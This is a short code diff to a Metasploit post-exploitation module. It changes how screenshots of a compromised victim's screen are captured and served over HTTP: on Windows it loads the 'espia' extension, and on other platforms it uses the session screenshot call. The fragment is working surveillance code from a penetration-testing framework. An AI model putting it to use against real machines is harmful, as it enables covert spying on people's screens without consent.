@@ -41,8 +41,13 @@ class MetasploitModule < Msf::Post
 
   def on_request_uri(cli, request)
     if request.uri =~ %r{/screenshot$}
-      quality = 50
-      data = session.ui.screenshot(quality)
+      data = ''
+      if session.platform == 'windows'
+        session.console.run_single('load espia') unless session.espia
+        data = session.espia.espia_image_get_dev_screen
+      else
+        data = session.ui.screenshot(50)
+      end
       send_response(cli, data, {'Content-Type'=>'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
     elsif request.uri =~ %r{/event$}
       query = CGI.parse(request.body)
